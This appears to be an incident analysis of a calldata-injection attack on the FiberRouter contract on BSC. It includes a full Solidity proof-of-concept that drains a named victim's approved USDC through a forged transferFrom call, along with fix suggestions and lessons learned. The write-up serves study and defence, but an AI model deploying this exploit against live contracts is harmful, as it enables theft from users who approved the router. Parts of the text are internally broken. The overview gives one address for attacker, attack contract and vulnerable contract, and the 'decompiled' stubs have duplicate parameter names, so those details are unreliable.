# FiberRouter Calldata Injection Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | FiberRouter (Ferrum Network) |
| Date | 2023-11-12 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~59 USDC |
| Attack Type | Unauthorized transferFrom via swapAndCrossOneInch() Calldata Injection |
| CWE | CWE-20 (Improper Input Validation) |
| Attacker Address | `0x4826e896E39DC96A8504588D21e9D44750435e2D` |
| Attack Contract | `0x4826e896E39DC96A8504588D21e9D44750435e2D` |
| Vulnerable Contract | `0x4826e896E39DC96A8504588D21e9D44750435e2D` (FiberRouter) |
| Fork Block | 33,874,498 |

## 2. Vulnerable Code Analysis

FiberRouter's `swapAndCrossOneInch()` function did not validate the `_calldata` parameter used when calling an external DEX router. An attacker could encode `USDC.transferFrom(victim, attacker, amount)` into `_calldata` to transfer a victim's USDC without authorization.

```solidity
// Vulnerable pattern: external call without _calldata validation
contract FiberRouter {
    function swapAndCrossOneInch(
        address swapRouter,
        uint256 amountIn,
        uint256 amountCrossMin,
        uint256 crossTargetNetwork,
        address crossTargetToken,
        address crossTargetAddress,
        uint256 swapBridgeAmount,
        bytes memory _calldata,       // ← unvalidated calldata
        address fromToken,
        address foundryToken
    ) external {
        // Vulnerable: _calldata forwarded as-is to swapRouter
        (bool success,) = swapRouter.call(_calldata);
        require(success, "Swap failed");
        // If swapRouter = USDC contract and _calldata = encoded transferFrom(...), arbitrary transfer is possible
    }
}
```

**Vulnerability**: By encoding a `transferFrom` call that moves a victim's tokens into `_calldata` and specifying the USDC contract address as `swapRouter`, an attacker could unauthorized transfer the victim's USDC within the FiberRouter context. The attack succeeds if the victim has previously approved FiberRouter to spend their USDC.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// File: FiberRouter_decompiled.sol
    function nonEvmSwapAndCrossOneInch(address account, uint256 value, uint256 shares, string param3, string param4, string param5, bytes data, address from_, address from_, uint256 tokenId) external {}  // ❌

// ...

    function swapAndCrossOneInch(address account, uint256 value, uint256 shares, uint256 tokenId, address to, address from_, uint256 tokenId, bytes data, address from_, address from_) external {}  // ❌
```

## 3. Attack Flow

```
Attacker [0x4826e896E39DC96A8504588D21e9D44750435e2D]
  │
  ├─1─▶ PancakeRouter.swapExactETHForTokens{0.0000001 ETH}
  │      [PancakeRouter: 0x10ED43C718714eb63d5aA57B78B54704E256024E]
  │      Small amount of WBNB → USDC swap
  │      → Sent to FiberRouter address (to satisfy amount condition)
  │
  ├─2─▶ FiberRouter.swapAndCrossOneInch(
  │          swapRouter = address(USDC),  ← USDC contract used as router
  │          amountIn = 0,
  │          amountCrossMin = 1,
  │          crossTargetNetwork = 43114,
  │          crossTargetToken = crossToken,
  │          crossTargetAddress = crossToken,
  │          swapBridgeAmount = 0,
  │          _calldata = transferFrom(victim, attacker, victim_balance),  ← malicious calldata
  │          fromToken = USDC,
  │          foundryToken = USDC
  │      )
  │      [FiberRouter: 0x4826e896E39DC96A8504588D21e9D44750435e2D]
  │      USDC.transferFrom(victim, attacker, amount) executed
  │      [Victim: 0x4da35bf35504D77e5C5E9Db6a35B76eB4479306a]
  │
  └─3─▶ 59 USDC drained from victim
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface FiberRouter {
    function swapAndCrossOneInch(
        address swapRouter,
        uint256 amountIn,
        uint256 amountCrossMin,
        uint256 crossTargetNetwork,
        address crossTargetToken,
        address crossTargetAddress,
        uint256 swapBridgeAmount,
        bytes memory _calldata,
        address fromToken,
        address foundryToken
    ) external;
}

contract FiberRouterExploit {
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 usdc = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    FiberRouter fiberrouter = FiberRouter(0x4826e896E39DC96A8504588D21e9D44750435e2D);
    address victim = 0x4da35bf35504D77e5C5E9Db6a35B76eB4479306a;
    address crossToken = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;

    function attack() public {
        // Deposit small amount of USDC into FiberRouter (to satisfy condition)
        wbnb.approve(address(pancakeRouter), 99_999 ether);
        address[] memory swapPath = new address[](2);
        swapPath[0] = address(wbnb);
        swapPath[1] = address(usdc);
        pancakeRouter.swapExactETHForTokens{value: 0.0000001 ether}(
            1, swapPath, address(fiberrouter), block.timestamp + 20
        );

        // Malicious calldata: transferFrom(victim, attacker, victim_balance)
        bytes memory datas = abi.encodePacked(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                address(victim),
                address(this),
                usdc.balanceOf(address(victim))
            )
        );

        // Pass USDC contract as router + malicious calldata to swapAndCrossOneInch
        fiberrouter.swapAndCrossOneInch(
            address(usdc),   // swapRouter = USDC contract
            0,               // amountIn
            1,               // amountCrossMin
            43_114,          // crossTargetNetwork (Avalanche)
            address(crossToken),
            address(crossToken),
            0,
            datas,           // encoded transferFrom call
            address(usdc),
            address(usdc)
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-20 (Improper Input Validation) |
| Vulnerability Type | Missing validation of swapAndCrossOneInch _calldata parameter; arbitrary contract call allowed |
| Impact Scope | All user assets that have approved FiberRouter |
| Explorer | [BSCscan](https://bscscan.com/address/0x4826e896E39DC96A8504588D21e9D44750435e2D) |

## 6. Security Recommendations

```solidity
// Fix 1: swapRouter whitelist
mapping(address => bool) public approvedRouters;

function swapAndCrossOneInch(
    address swapRouter,
    ...
    bytes memory _calldata,
    ...
) external {
    require(approvedRouters[swapRouter], "Router not approved");
    (bool success,) = swapRouter.call(_calldata);
    require(success);
}

// Fix 2: Validate _calldata function selector
bytes4 constant SWAP_SELECTOR = bytes4(keccak256("swap(...)"));

function swapAndCrossOneInch(..., bytes memory _calldata, ...) external {
    bytes4 selector = bytes4(_calldata);
    require(selector == SWAP_SELECTOR || selector == ANOTHER_SAFE_SELECTOR,
            "Invalid calldata selector");
    // ...
}

// Fix 3: Blacklist dangerous function selectors such as transferFrom
function _validateCalldata(bytes memory data) internal pure {
    bytes4 selector = bytes4(data);
    require(selector != IERC20.transferFrom.selector, "transferFrom not allowed");
    require(selector != IERC20.transfer.selector, "transfer not allowed");
    require(selector != IERC20.approve.selector, "approve not allowed");
}
```

## 7. Lessons Learned

1. **Arbitrary Calldata Injection Vulnerability**: Forwarding externally supplied calldata to an arbitrary contract without validation is a classic "Arbitrary External Call" vulnerability. Cross-chain bridges and DEX aggregators are frequently exposed to this pattern.
2. **transferFrom Abuse**: When a user has approved a contract to spend their tokens and that contract executes arbitrary calldata, an attacker can drain the user's assets via a third-party `transferFrom` call.
3. **Cross-Chain Bridge Security**: Routers that handle cross-chain messages must exercise particular caution with external inputs such as `_calldata`. A whitelist should be implemented so that only approved routers and functions can be invoked.
4. **Patterns Revealed by Small-Scale Attacks**: Although the loss was only $59, had this vulnerability been applied to users with larger approved allowances, the damage could have been catastrophic.